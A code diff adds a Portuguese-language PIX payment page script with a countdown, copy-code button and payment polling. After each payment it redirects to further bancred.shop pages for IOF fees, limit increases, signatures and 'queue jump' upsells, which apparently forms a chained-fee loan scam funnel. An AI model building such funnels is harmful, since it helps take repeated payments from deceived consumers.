+                timeLeftTextEl.textContent = 'EXPIRADO';
+                timeLeftTextEl.classList.add('text-red-800');
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+            }
+        }, 1000);
+        
+        console.log('Timer iniciado com 15 minutos (900 segundos)');
+    }
+}
+
+function updateTimer(expiresAt) {
+    const timeLeftTextEl = document.getElementById('timeLeftText');
+    
+    // Limpar intervalo anterior se existir
+    if (timerInterval) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+    }
+    
+    function update() {
+        const now = new Date();
+        const expiresDate = new Date(expiresAt);
+        const diff = Math.max(0, Math.floor((expiresDate - now) / 1000));
+        
+        if (diff === 0) {
+            // Timer expirado
+            if (timeLeftTextEl) {
+                timeLeftTextEl.textContent = 'EXPIRADO';
+                timeLeftTextEl.classList.add('text-red-800');
+            }
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            return;
+        }
+        
+        timeLeft = diff;
+        if (timeLeftTextEl) {
+            timeLeftTextEl.textContent = formatTime(timeLeft);
+        }
+    }
+    
+    // Atualizar imediatamente
+    update();
+    
+    // Atualizar a cada segundo
+    timerInterval = setInterval(update, 1000);
+    
+    console.log('Timer atualizado com data de expiração:', expiresAt);
+    console.log('Tempo restante calculado:', timeLeft, 'segundos');
+}
+
+// ============================================
+// CÓPIA DO CÓDIGO PIX
+// ============================================
+
+$(document).on('click', '#copyPixBtn', function(){
+    const codigo = document.getElementById('pixCode').value.trim();
+    
+    if (!codigo) {
+        alert('Código PIX não disponível');
+        return;
+    }
+    
+    navigator.clipboard.writeText(codigo).then(() => {
+        const $btn = $(this);
+        $btn.html(`
+            <div class="flex items-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-5 w-5"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
+                <span>Código Copiado!</span>
+            </div>`);
+
+        $btn.removeClass('from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 hover:shadow-blue-200/50')
+        .addClass('from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 shadow-green-200/50');
+
+        $('#copiado').removeClass('hidden').addClass('flex');
+
+        setTimeout(() => {
+            $btn.html(`
+                <div class="flex items-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-5 w-5"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
+                    <span>Copiar Código</span>
+                </div>`);
+
+            $btn.addClass('from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 hover:shadow-blue-200/50')
+            .removeClass('from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 shadow-green-200/50');
+
+            $('#copiado').addClass('hidden').removeClass('flex');
+        }, 4000);
+    }).catch(() => {
+        alert('Não foi possível copiar o código.');
+    });
+});
+
+// ============================================
+// VERIFICAÇÃO DE STATUS DO PAGAMENTO
+// ============================================
+
+let paymentConfirmed = false;
+
+function startPaymentStatusCheck(id) {
+    const startTime = Date.now();
+    const maxDuration = 30 * 60 * 1000; // 30 minutos
+    
+    async function loopCheck() {
+        if (paymentConfirmed || Date.now() - startTime > maxDuration) {
+            return;
+        }
+    
+        await checkPaymentStatus(id);
+            
+        if (!paymentConfirmed) {
+            setTimeout(loopCheck, 3000); // Verificar a cada 3 segundos
+        }
+    }
+        
+    loopCheck();
+}
+        
+async function checkPaymentStatus(id) {
+    try {
+        // Tentar obter external_id dos dados salvos no sessionStorage
+        let transactionIdToCheck = id;
+        try {
+            const storedPix = sessionStorage.getItem('pixData_' + id);
+            if (storedPix) {
+                const pixData = JSON.parse(storedPix);
+                // Priorizar external_id se disponível, senão usar o id
+                if (pixData.external_id) {
+                    transactionIdToCheck = pixData.external_id;
+                    console.log('Usando external_id para verificar status:', transactionIdToCheck);
+                }
+            }
+        } catch (e) {
+            console.warn('Erro ao obter external_id, usando transactionId:', e);
+        }
+        
+        // Usar API real da Duttyfy
+        const apiUrl = getApiUrl('confirmar.php');
+        const response = await fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
+            },
+            body: JSON.stringify({ transactionId: transactionIdToCheck })
+        });
+        
+        if (!response.ok) {
+            console.error('Erro HTTP ao verificar status:', response.status);
+            return;
+        }
+        
+        const data = await response.json();
+        
+        if (data.success && data.data && data.data.status === 'paid') {
+            paymentConfirmed = true;
+            
+            // Obter serviço do sessionStorage ou verificar se é Cliente Black
+            try {
+                const produto = JSON.parse(sessionStorage.getItem('produto') || '{}');
+                servico = produto.service || "Payment EMP";
+            } catch (e) {
+                servico = "Payment EMP";
+            }
+            
+            // Se for Cliente Black (via parâmetro black=1 ou serviço), garantir redirecionamento para iof.html
+            if (isBlackClient || servico === 'Cliente Black - Fura Fila') {
+                servico = 'Payment EMP'; // Usar o mesmo redirecionamento do Payment EMP (iof.html)
+            }
+            
+            // Redirecionar baseado no tipo de serviço
+            const isLocal = window.location.hostname === 'localhost' || 
+                          window.location.hostname === '127.0.0.1' ||
+                          window.location.protocol === 'file:';
+            
+            let redirectUrl;
+            if (isLocal) {
+                const currentPath = window.location.pathname;
+                const basePath = currentPath.substring(0, currentPath.indexOf('/conta'));
+                
+                if(servico == 'Payment EMP'){
+                    redirectUrl = basePath + '/conta/saque/iof2.htm';
+                } else if(servico == 'Payment EMP UP1'){
+                    redirectUrl = basePath + '/conta/app-download.htm';
+                } else if(servico == 'Payment EMP UP2'){
+                    redirectUrl = basePath + '/conta/aumento-limite.htm';
+                } else if(servico == 'Payment EMP UP3'){
+                    redirectUrl = basePath + '/conta/assinatura.htm';
+                } else if(servico == 'Payment EMP UP4'){
+                    redirectUrl = basePath + '/conta/confirmacao-dados.htm';
+                } else if(servico == 'Payment EMP UP5'){
+                    redirectUrl = basePath + '/conta/saque/iof.html';
+                } else {
+                    redirectUrl = basePath + '/conta/saque/iof2.htm';
+                }
+                
+                redirectUrl = window.location.origin + redirectUrl + getTrackingParams();
+            } else {
+                const trackingParams = getTrackingParams();
+                if(servico == 'Payment EMP'){
+                    redirectUrl = "https://bancred.shop/conta/saque/iof2.htm" + trackingParams;
+                } else if(servico == 'Payment EMP UP1'){
+                    redirectUrl = "https://bancred.shop/conta/app-download.htm" + trackingParams;
+                } else if(servico == 'Payment EMP UP2'){
+                    redirectUrl = "https://bancred.shop/conta/aumento-limite.htm" + trackingParams;
+                } else if(servico == 'Payment EMP UP3'){
+                    redirectUrl = "https://bancred.shop/conta/assinatura.htm" + trackingParams;
+                } else if(servico == 'Payment EMP UP4'){
+                    redirectUrl = "https://bancred.shop/conta/confirmacao-dados.htm" + trackingParams;
+                } else if(servico == 'Payment EMP UP5'){
+                    redirectUrl = "https://bancred.shop/conta/saque/iof.html" + trackingParams;
+                } else {
+                    redirectUrl = "https://bancred.shop/conta/saque/iof2.htm" + trackingParams;
+                }
+            }
+            
+            console.log('Pagamento confirmado! Redirecionando para:', redirectUrl);
+            window.location.href = redirectUrl;
+        }
+    } catch (error) {
+        console.error('Erro ao verificar status do pagamento:', error);
+    }
+}
+</script>
+<script defer="" src="../../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-17" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b9599e1da994470b9c098e5fca4ee72d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
+
